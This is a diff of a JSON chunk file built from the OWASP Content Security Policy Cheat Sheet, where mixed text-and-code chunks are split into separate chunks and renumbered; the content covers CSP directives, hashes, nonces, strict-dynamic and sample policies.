-      "text_content": "When inline scripts are required, the `script-src 'hash_algo-hash'` is another option for allowing only specific scripts to execute.\n\n```text\nContent-Security-Policy: script-src 'sha256-V2kaaafImTjn8RQTWZmF4IfGfQ7Qsqsw9GWaFjzFNPg='\n```\n\nTo get the hash, look at Google Chrome developer tools for violations like this:\n\n> ❌ Refused to execute inline script because it violates the following Content Security Policy directive: \"...\" Either the 'unsafe-inline' keyword, a hash (__'sha256-V2kaaafImTjn8RQTWZmF4IfGfQ7Qsqsw9GWaFjzFNPg='__), or a nonce...\n\nYou can also use this [hash generator](https://report-uri.com/home/hash).\n\nThis is a great [example](https://csp.withgoogle.com/docs/faq.html#static-content) of using hashes.",
-      "token_count": 173,
+      "chunk_idx": 55,
+      "chunk_type": "paragraph",
+      "text_content": "When inline scripts are required, the `script-src 'hash_algo-hash'` is another option for allowing only specific scripts to execute.",
+      "token_count": 28,
       "chunk_strategy": "structure_aware",
       "heading_path": [
         "Content Security Policy Cheat Sheet",
@@ -619,10 +850,40 @@
       ]
     },
     {
-      "chunk_id": "ver_4d5e2f4d1c42_c00041",
+      "chunk_id": "ver_4d5e2f4d1c42_c00056",
       "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
       "version_id": "ver_4d5e2f4d1c42",
-      "chunk_idx": 41,
+      "chunk_idx": 56,
+      "chunk_type": "code",
+      "text_content": "```text\nContent-Security-Policy: script-src 'sha256-V2kaaafImTjn8RQTWZmF4IfGfQ7Qsqsw9GWaFjzFNPg='\n```",
+      "token_count": 22,
+      "chunk_strategy": "structure_aware",
+      "heading_path": [
+        "Content Security Policy Cheat Sheet",
+        "Strict CSP",
+        "Hashes"
+      ]
+    },
+    {
+      "chunk_id": "ver_4d5e2f4d1c42_c00057",
+      "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+      "version_id": "ver_4d5e2f4d1c42",
+      "chunk_idx": 57,
+      "chunk_type": "paragraph",
+      "text_content": "To get the hash, look at Google Chrome developer tools for violations like this:\n\n> ❌ Refused to execute inline script because it violates the following Content Security Policy directive: \"...\" Either the 'unsafe-inline' keyword, a hash (__'sha256-V2kaaafImTjn8RQTWZmF4IfGfQ7Qsqsw9GWaFjzFNPg='__), or a nonce...\n\nYou can also use this [hash generator](https://report-uri.com/home/hash).\n\nThis is a great [example](https://csp.withgoogle.com/docs/faq.html#static-content) of using hashes.",
+      "token_count": 123,
+      "chunk_strategy": "structure_aware",
+      "heading_path": [
+        "Content Security Policy Cheat Sheet",
+        "Strict CSP",
+        "Hashes"
+      ]
+    },
+    {
+      "chunk_id": "ver_4d5e2f4d1c42_c00058",
+      "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+      "version_id": "ver_4d5e2f4d1c42",
+      "chunk_idx": 58,
       "chunk_type": "heading",
       "text_content": "#### Note",
       "token_count": 5,
@@ -635,10 +896,10 @@
       ]
     },
     {
-      "chunk_id": "ver_4d5e2f4d1c42_c00042",
+      "chunk_id": "ver_4d5e2f4d1c42_c00059",
       "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
       "version_id": "ver_4d5e2f4d1c42",
-      "chunk_idx": 42,
+      "chunk_idx": 59,
       "chunk_type": "paragraph",
       "text_content": "Using hashes can be a risky approach.\n\nIf you change *anything* inside the script tag (even whitespace) by, e.g., formatting your code, the hash will be different, and the script won't render.",
       "token_count": 47,
@@ -651,10 +912,10 @@
       ]
     },
     {
-      "chunk_id": "ver_4d5e2f4d1c42_c00043",
+      "chunk_id": "ver_4d5e2f4d1c42_c00060",
       "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
       "version_id": "ver_4d5e2f4d1c42",
-      "chunk_idx": 43,
+      "chunk_idx": 60,
       "chunk_type": "heading",
       "text_content": "### strict-dynamic",
       "token_count": 6,
@@ -666,10 +927,10 @@
       ]
     },
     {
-      "chunk_id": "ver_4d5e2f4d1c42_c00044",
+      "chunk_id": "ver_4d5e2f4d1c42_c00061",
       "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
       "version_id": "ver_4d5e2f4d1c42",
-      "chunk_idx": 44,
+      "chunk_idx": 61,
       "chunk_type": "paragraph",
       "text_content": "The `strict-dynamic` directive can be used as part of a Strict CSP in combination with either hashes or nonces.\n\nIf a script block which has either the correct hash or nonce is creating additional DOM elements and executing JS inside of them, `strict-dynamic` tells the browser to trust those elements as well without having to explicitly add nonces or hashes for each one.\n\nNote that while `strict-dynamic` is a CSP level 3 feature, CSP level 3 is very widely supported in common, modern browsers.\n\nFor more details, check out [strict-dynamic usage](https://w3c.github.io/webappsec-csp/#strict-dynamic-usage).",
       "token_count": 137,
@@ -681,10 +942,10 @@
       ]
     },
     {
-      "chunk_id": "ver_4d5e2f4d1c42_c00045",
+      "chunk_id": "ver_4d5e2f4d1c42_c00062",
       "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
       "version_id": "ver_4d5e2f4d1c42",
-      "chunk_idx": 45,
+      "chunk_idx": 62,
       "chunk_type": "heading",
       "text_content": "## Detailed CSP Directives",
       "token_count": 5,
@@ -695,10 +956,10 @@
       ]
     },
     {
-      "chunk_id": "ver_4d5e2f4d1c42_c00046",
+      "chunk_id": "ver_4d5e2f4d1c42_c00063",
       "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
       "version_id": "ver_4d5e2f4d1c42",
-      "chunk_idx": 46,
+      "chunk_idx": 63,
       "chunk_type": "paragraph",
       "text_content": "Multiple types of directives exist that allow the developer to control the flow of the policies granularly.\n\nNote that creating a non-Strict policy that is too granular or permissive is likely to lead to bypasses and a loss of protection.",
       "token_count": 44,
@@ -709,10 +970,10 @@
       ]
     },
     {
-      "chunk_id": "ver_4d5e2f4d1c42_c00047",
+      "chunk_id": "ver_4d5e2f4d1c42_c00064",
       "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
       "version_id": "ver_4d5e2f4d1c42",
-      "chunk_idx": 47,
+      "chunk_idx": 64,
       "chunk_type": "heading",
       "text_content": "### Fetch Directives",
       "token_count": 5,
@@ -724,10 +985,10 @@
       ]
     },
     {
-      "chunk_id": "ver_4d5e2f4d1c42_c00048",
+      "chunk_id": "ver_4d5e2f4d1c42_c00065",
       "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
       "version_id": "ver_4d5e2f4d1c42",
-      "chunk_idx": 48,
+      "chunk_idx": 65,
       "chunk_type": "mixed",
       "text_content": "Fetch directives tell the browser the locations to trust and load resources from.\n\nMost fetch directives have a certain [fallback list specified in w3](https://www.w3.org/TR/CSP3/#directive-fallback-list).\n\nThis list allows for granular control of the source of scripts, images, files, etc.\n\n- `child-src` allows the developer to control nested browsing contexts and worker execution contexts.\n\n- `connect-src` provides control over fetch requests, XHR, eventsource, beacon and websockets connections.\n\n- `font-src` specifies which URLs to load fonts from.\n\n- `img-src` specifies the URLs that images can be loaded from.\n\n- `manifest-src` specifies the URLs that application manifests may be loaded from.\n\n- `media-src` specifies the URLs from which video, audio and text track resources can be loaded from.\n\n- `prefetch-src` was an experimental directive for prefetch/prerender resource URLs.\n\nIt was __removed from the CSP Level 3 specification__ and is ignored by modern browsers — do not rely on it for defense.\n\nConstrain scripts, styles, and default fetches with the standard fetch directives instead.\n\n- `object-src` specifies the URLs from which plugins can be loaded from.\n\n- `script-src` specifies the locations from which a script can be executed from.\n\nIt is a fallback directive for other script-like directives.\n\n- `script-src-elem` controls the location from which execution of script requests and blocks can occur.\n\n- `script-src-attr` controls the execution of event handlers.\n\n- `style-src` controls from where styles get applied to a document.\n\nThis includes `<link>` elements, `@import` rules, and requests originating from a `Link` HTTP response header field.\n\n- `style-src-elem` controls styles except for inline attributes.\n\n- `style-src-attr` controls styles attributes.\n\n- `default-src` is a fallback directive for the other fetch directives.\n\nDirectives that are specified have no inheritance, yet directives that are not specified will fall back to the value of `default-src`.",
       "token_count": 432,
@@ -739,10 +1000,10 @@
       ]
     },
     {
-      "chunk_id": "ver_4d5e2f4d1c42_c00049",
+      "chunk_id": "ver_4d5e2f4d1c42_c00066",
       "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
       "version_id": "ver_4d5e2f4d1c42",
-      "chunk_idx": 49,
+      "chunk_idx": 66,
       "chunk_type": "heading",
       "text_content": "### Document Directives",
       "token_count": 5,
@@ -754,10 +1015,10 @@
       ]
     },
     {
-      "chunk_id": "ver_4d5e2f4d1c42_c00050",
+      "chunk_id": "ver_4d5e2f4d1c42_c00067",
       "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
       "version_id": "ver_4d5e2f4d1c42",
-      "chunk_idx": 50,
+      "chunk_idx": 67,
       "chunk_type": "mixed",
       "text_content": "Document directives instruct the browser about the properties of the document to which the policies will apply to.\n\n- `base-uri` specifies the possible URLs that the `<base>` element can use.\n\n- `plugin-types` has been [removed from the CSP specification](https://bugs.webkit.org/show_bug.cgi?id=220724).\n\nDo not rely on it to enforce content types.\n\nUse `object-src 'none'` when embedded objects are unnecessary, as in the [strict policy examples](#strict-policy).\n\n- `sandbox` restricts a page's actions such as submitting forms.\n\n- Only applies when used with the request header `Content-Security-Policy`.\n\n- Not specifying a value for the directive activates all of the sandbox restrictions.\n\n`Content-Security-Policy: sandbox;`\n    - [Sandbox syntax](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/sandbox#Syntax)",
       "token_count": 210,
@@ -769,10 +1030,10 @@
       ]
     },
     {
-      "chunk_id": "ver_4d5e2f4d1c42_c00051",
+      "chunk_id": "ver_4d5e2f4d1c42_c00068",
       "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
       "version_id": "ver_4d5e2f4d1c42",
-      "chunk_idx": 51,
+      "chunk_idx": 68,
       "chunk_type": "heading",
       "text_content": "### Navigation Directives",
       "token_count": 5,
@@ -784,10 +1045,10 @@
       ]
     },
     {
-      "chunk_id": "ver_4d5e2f4d1c42_c00052",
+      "chunk_id": "ver_4d5e2f4d1c42_c00069",
       "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
       "version_id": "ver_4d5e2f4d1c42",
-      "chunk_idx": 52,
+      "chunk_idx": 69,
       "chunk_type": "mixed",
       "text_content": "Navigation directives instruct the browser about the locations that the document can navigate to or be embedded from.\n\n- `form-action` restricts the URLs which the forms can submit to.\n\n- `frame-ancestors` restricts the URLs that can embed the requested resource inside of `<frame>`, `<iframe>`, `<object>`, `<embed>`, or `<applet>` elements.\n\n- If this directive is specified in a `<meta>` tag, the directive is ignored.\n\n- This directive doesn't fallback to the `default-src` directive.\n\n- `X-Frame-Options` is rendered obsolete by this directive and is ignored by the user agents.",
       "token_count": 142,
@@ -799,10 +1060,10 @@
       ]
     },
     {
-      "chunk_id": "ver_4d5e2f4d1c42_c00053",
+      "chunk_id": "ver_4d5e2f4d1c42_c00070",
       "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
       "version_id": "ver_4d5e2f4d1c42",
-      "chunk_idx": 53,
+      "chunk_idx": 70,
       "chunk_type": "heading",
       "text_content": "### Reporting Directives",
       "token_count": 5,
@@ -814,10 +1075,10 @@
       ]
     },
     {
-      "chunk_id": "ver_4d5e2f4d1c42_c00054",
+      "chunk_id": "ver_4d5e2f4d1c42_c00071",
       "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
       "version_id": "ver_4d5e2f4d1c42",
-      "chunk_idx": 54,
+      "chunk_idx": 71,
       "chunk_type": "mixed",
       "text_content": "Reporting directives deliver violations of prevented behaviors to specified locations.\n\nThese directives serve no purpose on their own and are dependent on other directives.\n\n- `report-to` (CSP Level 3, used together with the [Reporting API](https://developer.mozilla.org/en-US/docs/Web/API/Reporting_API)) is the __primary, current__ reporting directive.\n\nIt references an endpoint name defined in the [Reporting-Endpoints response header](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Reporting-Endpoints#syntax), which uses comma-separated `name=\"URL\"` entries.\n\nThe legacy `Report-To` header uses JSON instead.\n\n- [MDN report-to documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/report-to)\n- `report-uri` is __deprecated__ by CSP Level 3 in favor of `report-to`.\n\nIt takes a URI that reports are sent to.\n\n- Format: `Content-Security-Policy: report-uri https://example.com/csp-reports`\n\nFor backward compatibility, declare both directives in conjunction.\n\nBrowsers that support `report-to` will use it and ignore `report-uri`; older browsers fall back to `report-uri`.\n\nOnce support for legacy browsers is no longer required, `report-uri` can be removed.",
       "token_count": 306,
@@ -829,10 +1090,10 @@
       ]
     },
     {
-      "chunk_id": "ver_4d5e2f4d1c42_c00055",
+      "chunk_id": "ver_4d5e2f4d1c42_c00072",
       "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
       "version_id": "ver_4d5e2f4d1c42",
-      "chunk_idx": 55,
+      "chunk_idx": 72,
       "chunk_type": "heading",
       "text_content": "### Special Directive Sources",
       "token_count": 6,
@@ -844,10 +1105,10 @@
       ]
     },
     {
-      "chunk_id": "ver_4d5e2f4d1c42_c00056",
+      "chunk_id": "ver_4d5e2f4d1c42_c00073",
       "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
       "version_id": "ver_4d5e2f4d1c42",
-      "chunk_idx": 56,
+      "chunk_idx": 73,
       "chunk_type": "table",
       "text_content": "| Value | Description |\n|------------------|-----------------------------------------------------------------------------|\n| 'none' | No URLs match. |\n| 'self' | Refers to the origin site with the same scheme and port number. |\n| 'unsafe-inline' | Allows the usage of inline scripts or styles. |\n| 'unsafe-eval' | Allows the usage of eval in scripts. |",
       "token_count": 165,
@@ -859,10 +1120,10 @@
       ]
     },
     {
-      "chunk_id": "ver_4d5e2f4d1c42_c00057",
+      "chunk_id": "ver_4d5e2f4d1c42_c00074",
       "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
       "version_id": "ver_4d5e2f4d1c42",
-      "chunk_idx": 57,
+      "chunk_idx": 74,
       "chunk_type": "paragraph",
       "text_content": "To better understand how the directive sources work, check out the [source lists from w3c](https://w3c.github.io/webappsec-csp/#framework-directive-source-list).",
       "token_count": 43,
@@ -874,10 +1135,10 @@
       ]
     },
     {
-      "chunk_id": "ver_4d5e2f4d1c42_c00058",
+      "chunk_id": "ver_4d5e2f4d1c42_c00075",
       "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
       "version_id": "ver_4d5e2f4d1c42",
-      "chunk_idx": 58,
+      "chunk_idx": 75,
       "chunk_type": "heading",
       "text_content": "## CSP Sample Policies",
       "token_count": 5,
@@ -888,10 +1149,10 @@
       ]
     },
     {
-      "chunk_id": "ver_4d5e2f4d1c42_c00059",
+      "chunk_id": "ver_4d5e2f4d1c42_c00076",
       "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
       "version_id": "ver_4d5e2f4d1c42",
-      "chunk_idx": 59,
+      "chunk_idx": 76,
       "chunk_type": "heading",
       "text_content": "### Strict Policy",
       "token_count": 5,
@@ -903,10 +1164,10 @@
       ]
     },
     {
-      "chunk_id": "ver_4d5e2f4d1c42_c00060",
+      "chunk_id": "ver_4d5e2f4d1c42_c00077",
       "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
       "version_id": "ver_4d5e2f4d1c42",
-      "chunk_idx": 60,
+      "chunk_idx": 77,
       "chunk_type": "paragraph",
       "text_content": "A strict policy's role is to protect against classical stored, reflected, and some of the DOM XSS attacks and should be the optimal goal of any team trying to implement CSP.\n\nAs noted above, Google went ahead and set up a detailed and methodological [instructions](https://web.dev/strict-csp) for creating a Strict CSP.\n\nBased on those instructions, one of the following two policies can be used to apply a strict policy:",
       "token_count": 92,
@@ -918,10 +1179,10 @@
       ]
     },
     {
-      "chunk_id": "ver_4d5e2f4d1c42_c00061",
+      "chunk_id": "ver_4d5e2f4d1c42_c00078",
       "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
       "version_id": "ver_4d5e2f4d1c42",
-      "chunk_idx": 61,
+      "chunk_idx": 78,
       "chunk_type": "heading",
       "text_content": "#### Nonce-based Strict Policy",
       "token_count": 9,
@@ -934,10 +1195,10 @@
       ]
     },
     {
-      "chunk_id": "ver_4d5e2f4d1c42_c00062",
+      "chunk_id": "ver_4d5e2f4d1c42_c00079",
       "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
       "version_id": "ver_4d5e2f4d1c42",
-      "chunk_idx": 62,
+      "chunk_idx": 79,
       "chunk_type": "code",
       "text_content": "```text\nContent-Security-Policy:\n  script-src 'nonce-{RANDOM}' 'strict-dynamic';\n  object-src 'none';\n  base-uri 'none';\n```",
       "token_count": 43,
@@ -950,10 +1211,10 @@
       ]
     },
     {
-      "chunk_id": "ver_4d5e2f4d1c42_c00063",
+      "chunk_id": "ver_4d5e2f4d1c42_c00080",
       "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
       "version_id": "ver_4d5e2f4d1c42",
-      "chunk_idx": 63,
+      "chunk_idx": 80,
       "chunk_type": "heading",
       "text_content": "#### Hash-based Strict Policy",
       "token_count": 9,
@@ -966,10 +1227,10 @@
       ]
     },
     {
-      "chunk_id": "ver_4d5e2f4d1c42_c00064",
+      "chunk_id": "ver_4d5e2f4d1c42_c00081",
       "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
       "version_id": "ver_4d5e2f4d1c42",
-      "chunk_idx": 64,
+      "chunk_idx": 81,
       "chunk_type": "code",
       "text_content": "```text\nContent-Security-Policy:\n  script-src 'sha256-{HASHED_INLINE_SCRIPT}' 'strict-dynamic';\n  object-src 'none';\n  base-uri 'none';\n```",
       "token_count": 43,
@@ -982,10 +1243,10 @@
       ]
     },
     {
-      "chunk_id": "ver_4d5e2f4d1c42_c00065",
+      "chunk_id": "ver_4d5e2f4d1c42_c00082",
       "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
       "version_id": "ver_4d5e2f4d1c42",
-      "chunk_idx": 65,
+      "chunk_idx": 82,
       "chunk_type": "heading",
       "text_content": "### Basic non-Strict CSP Policy",
       "token_count": 9,
@@ -997,13 +1258,13 @@
       ]
     },
     {
-      "chunk_id": "ver_4d5e2f4d1c42_c00066",
+      "chunk_id": "ver_4d5e2f4d1c42_c00083",
       "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
       "version_id": "ver_4d5e2f4d1c42",
-      "chunk_idx": 66,
+      "chunk_idx": 83,
       "chunk_type": "mixed",
-      "text_content": "This policy can be used if it is not possible to create a Strict Policy and it prevents cross-site framing and cross-site form-submissions.\n\nIt will only allow resources from the originating domain for all the default level directives and will not allow inline scripts/styles to execute.\n\nIf your application functions with these restrictions, it drastically reduces your attack surface and works with most modern browsers.\n\nThe most basic policy assumes:\n\n- All resources are hosted by the same domain of the document.\n\n- There are no inlines or evals for scripts and style resources.\n\n- There is no need for other websites to frame the website.\n\n- There are no form-submissions to external websites.\n\n```text\nContent-Security-Policy: default-src 'self'; frame-ancestors 'self'; form-action 'self';\n```\n\nTo tighten further, one can apply the following:\n\n```text\nContent-Security-Policy: default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self'; style-src 'self'; frame-ancestors 'self'; form-action 'self';\n```\n\nThis policy allows images, scripts, AJAX, and CSS from the same origin and does not allow any other resources to load (e.g., object, frame, media, etc.).",
-      "token_count": 279,
+      "text_content": "This policy can be used if it is not possible to create a Strict Policy and it prevents cross-site framing and cross-site form-submissions.\n\nIt will only allow resources from the originating domain for all the default level directives and will not allow inline scripts/styles to execute.\n\nIf your application functions with these restrictions, it drastically reduces your attack surface and works with most modern browsers.\n\nThe most basic policy assumes:\n\n- All resources are hosted by the same domain of the document.\n\n- There are no inlines or evals for scripts and style resources.\n\n- There is no need for other websites to frame the website.\n\n- There are no form-submissions to external websites.",
+      "token_count": 133,
       "chunk_strategy": "structure_aware",
       "heading_path": [
         "Content Security Policy Cheat Sheet",
@@ -1012,10 +1273,70 @@
       ]
     },
     {
-      "chunk_id": "ver_4d5e2f4d1c42_c00067",
+      "chunk_id": "ver_4d5e2f4d1c42_c00084",
       "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
       "version_id": "ver_4d5e2f4d1c42",
-      "chunk_idx": 67,
+      "chunk_idx": 84,
+      "chunk_type": "code",
+      "text_content": "```text\nContent-Security-Policy: default-src 'self'; frame-ancestors 'self'; form-action 'self';\n```",
+      "token_count": 34,
+      "chunk_strategy": "structure_aware",
+      "heading_path": [
+        "Content Security Policy Cheat Sheet",
+        "CSP Sample Policies",
+        "Basic non-Strict CSP Policy"
+      ]
+    },
+    {
+      "chunk_id": "ver_4d5e2f4d1c42_c00085",
+      "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+      "version_id": "ver_4d5e2f4d1c42",
+      "chunk_idx": 85,
+      "chunk_type": "paragraph",
+      "text_content": "To tighten further, one can apply the following:",
+      "token_count": 10,
+      "chunk_strategy": "structure_aware",
+      "heading_path": [
+        "Content Security Policy Cheat Sheet",
+        "CSP Sample Policies",
+        "Basic non-Strict CSP Policy"
+      ]
+    },
+    {
+      "chunk_id": "ver_4d5e2f4d1c42_c00086",
+      "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+      "version_id": "ver_4d5e2f4d1c42",
+      "chunk_idx": 86,
+      "chunk_type": "code",
+      "text_content": "```text\nContent-Security-Policy: default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self'; style-src 'self'; frame-ancestors 'self'; form-action 'self';\n```",
+      "token_count": 62,
+      "chunk_strategy": "structure_aware",
+      "heading_path": [
+        "Content Security Policy Cheat Sheet",
+        "CSP Sample Policies",
+        "Basic non-Strict CSP Policy"
+      ]
+    },
+    {
+      "chunk_id": "ver_4d5e2f4d1c42_c00087",
+      "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+      "version_id": "ver_4d5e2f4d1c42",
+      "chunk_idx": 87,
+      "chunk_type": "paragraph",
+      "text_content": "This policy allows images, scripts, AJAX, and CSS from the same origin and does not allow any other resources to load (e.g., object, frame, media, etc.).",
+      "token_count": 40,
+      "chunk_strategy": "structure_aware",
+      "heading_path": [
+        "Content Security Policy Cheat Sheet",
+        "CSP Sample Policies",
+        "Basic non-Strict CSP Policy"
+      ]
+    },
+    {
+      "chunk_id": "ver_4d5e2f4d1c42_c00088",
+      "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+      "version_id": "ver_4d5e2f4d1c42",
+      "chunk_idx": 88,
       "chunk_type": "heading",
       "text_content": "### Upgrading insecure requests",
       "token_count": 6,
@@ -1027,13 +1348,13 @@
       ]
     },
     {
-      "chunk_id": "ver_4d5e2f4d1c42_c00068",
+      "chunk_id": "ver_4d5e2f4d1c42_c00089",
       "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
       "version_id": "ver_4d5e2f4d1c42",
-      "chunk_idx": 68,
-      "chunk_type": "mixed",
-      "text_content": "If the developer is migrating from HTTP to HTTPS, the following directive will ensure that all requests will be sent over HTTPS with no fallback to HTTP:\n\n```text\nContent-Security-Policy: upgrade-insecure-requests;\n```",
-      "token_count": 48,
+      "chunk_idx": 89,
+      "chunk_type": "paragraph",
+      "text_content": "If the developer is migrating from HTTP to HTTPS, the following directive will ensure that all requests will be sent over HTTPS with no fallback to HTTP:",
+      "token_count": 29,
       "chunk_strategy": "structure_aware",
       "heading_path": [
         "Content Security Policy Cheat Sheet",
@@ -1042,10 +1363,25 @@
       ]
     },
     {
-      "chunk_id": "ver_4d5e2f4d1c42_c00069",
+      "chunk_id": "ver_4d5e2f4d1c42_c00090",
       "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
       "version_id": "ver_4d5e2f4d1c42",
-      "chunk_idx": 69,
+      "chunk_idx": 90,
+      "chunk_type": "code",
+      "text_content": "```text\nContent-Security-Policy: upgrade-insecure-requests;\n```",
+      "token_count": 19,
+      "chunk_strategy": "structure_aware",
+      "heading_path": [
+        "Content Security Policy Cheat Sheet",
+        "CSP Sample Policies",
+        "Upgrading insecure requests"
+      ]
+    },
+    {
+      "chunk_id": "ver_4d5e2f4d1c42_c00091",
+      "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+      "version_id": "ver_4d5e2f4d1c42",
+      "chunk_idx": 91,
       "chunk_type": "heading",
       "text_content": "### Preventing framing attacks (clickjacking, cross-site leaks)",
       "token_count": 14,
@@ -1057,10 +1393,10 @@
       ]
     },
     {
-      "chunk_id": "ver_4d5e2f4d1c42_c00070",
+      "chunk_id": "ver_4d5e2f4d1c42_c00092",
       "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
       "version_id": "ver_4d5e2f4d1c42",
-      "chunk_idx": 70,
+      "chunk_idx": 92,
       "chunk_type": "list",
       "text_content": "- To prevent all framing of your content use:\n    - `Content-Security-Policy: frame-ancestors 'none';`\n- To allow for the site itself, use:\n    - `Content-Security-Policy: frame-ancestors 'self';`\n- To allow for trusted domain, do the following:\n    - `Content-Security-Policy: frame-ancestors trusted.com;`",
       "token_count": 79,
@@ -1072,10 +1408,10 @@
       ]
     },
     {
-      "chunk_id": "ver_4d5e2f4d1c42_c00071",
+      "chunk_id": "ver_4d5e2f4d1c42_c00093",
       "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
       "version_id": "ver_4d5e2f4d1c42",
-      "chunk_idx": 71,
+      "chunk_idx": 93,
       "chunk_type": "heading",
       "text_content": "### Refactoring inline code",
       "token_count": 6,
@@ -1087,13 +1423,13 @@
       ]
     },
     {
-      "chunk_id": "ver_4d5e2f4d1c42_c00072",
+      "chunk_id": "ver_4d5e2f4d1c42_c00094",
       "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
       "version_id": "ver_4d5e2f4d1c42",
-      "chunk_idx": 72,
-      "chunk_type": "mixed",
-      "text_content": "When `default-src` or `script-src*` directives are active, CSP by default disables any JavaScript code placed inline in the HTML source, such as this:\n\n```javascript\n<script>\nvar foo = \"314\"\n<script>\n```\n\nThe inline code can be moved to a separate JavaScript file and the code in the page becomes:\n\n```javascript\n<script src=\"app.js\">\n</script>\n```\n\nWith `app.js` containing the `var foo = \"314\"` code.\n\nThe inline code restriction also applies to `inline event handlers`, so that the following construct will be blocked under CSP:\n\n```html\n<button id=\"button1\" onclick=\"doSomething()\">\n```\n\nThis should be replaced by `addEventListener` calls:\n\n```javascript\ndocument.getElementById(\"button1\").addEventListener('click', doSomething);\n```",
-      "token_count": 193,
+      "chunk_idx": 94,
+      "chunk_type": "paragraph",
+      "text_content": "When `default-src` or `script-src*` directives are active, CSP by default disables any JavaScript code placed inline in the HTML source, such as this:",
+      "token_count": 35,
       "chunk_strategy": "structure_aware",
       "heading_path": [
         "Content Security Policy Cheat Sheet",
@@ -1102,10 +1438,115 @@
       ]
     },
     {
-      "chunk_id": "ver_4d5e2f4d1c42_c00073",
+      "chunk_id": "ver_4d5e2f4d1c42_c00095",
       "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
       "version_id": "ver_4d5e2f4d1c42",
-      "chunk_idx": 73,
+      "chunk_idx": 95,
+      "chunk_type": "code",
+      "text_content": "```javascript\n<script>\nvar foo = \"314\"\n<script>\n```",
+      "token_count": 19,
+      "chunk_strategy": "structure_aware",
+      "heading_path": [
+        "Content Security Policy Cheat Sheet",
+        "CSP Sample Policies",
+        "Refactoring inline code"
+      ]
+    },
+    {
+      "chunk_id": "ver_4d5e2f4d1c42_c00096",
+      "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+      "version_id": "ver_4d5e2f4d1c42",
+      "chunk_idx": 96,
+      "chunk_type": "paragraph",
+      "text_content": "The inline code can be moved to a separate JavaScript file and the code in the page becomes:",
+      "token_count": 19,
+      "chunk_strategy": "structure_aware",
+      "heading_path": [
+        "Content Security Policy Cheat Sheet",
+        "CSP Sample Policies",
+        "Refactoring inline code"
+      ]
+    },
+    {
+      "chunk_id": "ver_4d5e2f4d1c42_c00097",
+      "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+      "version_id": "ver_4d5e2f4d1c42",
+      "chunk_idx": 97,
+      "chunk_type": "code",
+      "text_content": "```javascript\n<script src=\"app.js\">\n</script>\n```",
+      "token_count": 21,
+      "chunk_strategy": "structure_aware",
+      "heading_path": [
+        "Content Security Policy Cheat Sheet",
+        "CSP Sample Policies",
+        "Refactoring inline code"
+      ]
+    },
+    {
+      "chunk_id": "ver_4d5e2f4d1c42_c00098",
+      "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+      "version_id": "ver_4d5e2f4d1c42",
+      "chunk_idx": 98,
+      "chunk_type": "paragraph",
+      "text_content": "With `app.js` containing the `var foo = \"314\"` code.\n\nThe inline code restriction also applies to `inline event handlers`, so that the following construct will be blocked under CSP:",
+      "token_count": 42,
+      "chunk_strategy": "structure_aware",
+      "heading_path": [
+        "Content Security Policy Cheat Sheet",
+        "CSP Sample Policies",
+        "Refactoring inline code"
+      ]
+    },
+    {
+      "chunk_id": "ver_4d5e2f4d1c42_c00099",
+      "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+      "version_id": "ver_4d5e2f4d1c42",
+      "chunk_idx": 99,
+      "chunk_type": "code",
+      "text_content": "```html\n<button id=\"button1\" onclick=\"doSomething()\">\n```",
+      "token_count": 22,
+      "chunk_strategy": "structure_aware",
+      "heading_path": [
+        "Content Security Policy Cheat Sheet",
+        "CSP Sample Policies",
+        "Refactoring inline code"
+      ]
+    },
+    {
+      "chunk_id": "ver_4d5e2f4d1c42_c00100",
+      "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+      "version_id": "ver_4d5e2f4d1c42",
+      "chunk_idx": 100,
+      "chunk_type": "paragraph",
+      "text_content": "This should be replaced by `addEventListener` calls:",
+      "token_count": 10,
+      "chunk_strategy": "structure_aware",
+      "heading_path": [
+        "Content Security Policy Cheat Sheet",
+        "CSP Sample Policies",
